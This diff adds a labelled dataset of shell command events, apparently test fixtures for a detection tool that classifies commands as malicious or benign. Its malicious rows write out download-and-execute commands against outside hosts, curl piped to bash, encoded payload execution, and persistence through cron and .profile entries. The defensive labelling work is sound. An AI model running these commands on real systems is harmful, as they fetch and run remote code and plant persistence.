@@ -1,0 +1,25 @@
+Time|Case|Host|User|SourceIP|Command|Context|Expected
+09:00:01|ATTACK|linux-web-01|user|198.51.100.77|curl http://198.51.100.200/payload.sh -o /tmp/update.sh|after suspicious SSH login|malicious
+09:00:10|ATTACK|linux-web-01|user|198.51.100.77|chmod +x /tmp/update.sh|after suspicious SSH login|malicious
+09:00:15|ATTACK|linux-web-01|user|198.51.100.77|/tmp/update.sh|after suspicious SSH login|malicious
+09:00:30|ATTACK|linux-web-01|user|198.51.100.77|echo "* * * * * root /tmp/update.sh" > /etc/cron.d/update-check|after suspicious SSH login|malicious
+10:00:01|BENIGN|linux-backup-01|backup|10.0.0.20|wget https://backup.company.local/agent.deb -O /tmp/agent.deb|approved backup update|benign
+10:00:20|BENIGN|linux-backup-01|backup|10.0.0.20|dpkg -i /tmp/agent.deb|approved backup update|benign
+11:00:01|EVASION|linux-app-01|appuser|203.0.113.55|python3 -c "import urllib.request; urllib.request.urlretrieve('http://203.0.113.200/a.sh','/home/appuser/.local/cache.sh')"|after suspicious SSH login|malicious
+11:00:10|EVASION|linux-app-01|appuser|203.0.113.55|bash /home/appuser/.local/cache.sh|after suspicious SSH login|malicious
+11:00:20|EVASION|linux-app-01|appuser|203.0.113.55|echo "bash /home/appuser/.local/cache.sh &" >> /home/appuser/.profile|after suspicious SSH login|malicious
+12:00:01|BENIGN_ADMIN|linux-admin-02|admin|10.0.0.30|curl https://repo.company.local/tool.sh -o /tmp/tool.sh|approved maintenance|benign
+12:00:05|BENIGN_ADMIN|linux-admin-02|admin|10.0.0.30|chmod +x /tmp/tool.sh|approved maintenance|benign
+12:00:10|BENIGN_ADMIN|linux-admin-02|admin|10.0.0.30|/tmp/tool.sh|approved maintenance|benign
+13:00:01|STEALTH_EXEC|linux-app-02|appuser|203.0.113.88|wget http://203.0.113.200/tool.sh -O /home/appuser/.local/tool.sh|unknown session|malicious
+13:00:10|STEALTH_EXEC|linux-app-02|appuser|203.0.113.88|bash /home/appuser/.local/tool.sh|unknown session|malicious
+14:00:01|FAKE_APPROVED|linux-app-03|appuser|203.0.113.99|wget http://203.0.113.200/fake.sh -O /home/appuser/.local/fake.sh|approved maintenance|malicious
+14:00:10|FAKE_APPROVED|linux-app-03|appuser|203.0.113.99|bash /home/appuser/.local/fake.sh|approved maintenance|malicious
+15:00:01|FILELESS|linux-web-02|user|203.0.113.120|curl -fsSL http://203.0.113.200/install.sh PIPE_TO_BASH|after suspicious SSH login|malicious
+16:00:01|ENCODED_FILELESS|linux-web-03|user|203.0.113.130|echo ZWNobyBTT0NfTEFC PIPE_TO_BASE64_DECODE PIPE_TO_BASH|unknown session|malicious
+17:00:01|BENIGN_BASE64|linux-user-01|user|10.0.0.50|echo SGVsbG8= PIPE_TO_BASE64_DECODE > /tmp/message.txt|normal file decoding|benign
+18:00:01|COMMAND_SUBSTITUTION|linux-web-04|user|203.0.113.140|bash -c "$(curl -fsSL http://203.0.113.200/install.sh)"|unknown session|malicious
+19:00:01|BENIGN_REMOTE_SCRIPT|linux-dev-02|developer|10.0.0.60|bash -c "$(curl -fsSL https://internal.company.local/setup.sh)"|approved developer setup|benign
+20:00:01|BENIGN_PERSISTENCE|linux-dev-03|developer|10.0.0.70|curl https://internal.company.local/startup.sh -o /home/developer/.local/startup.sh|approved developer setup|benign
+20:00:10|BENIGN_PERSISTENCE|linux-dev-03|developer|10.0.0.70|bash /home/developer/.local/startup.sh|approved developer setup|benign
+20:00:20|BENIGN_PERSISTENCE|linux-dev-03|developer|10.0.0.70|echo "bash /home/developer/.local/startup.sh" >> /home/developer/.profile|approved developer setup|benign
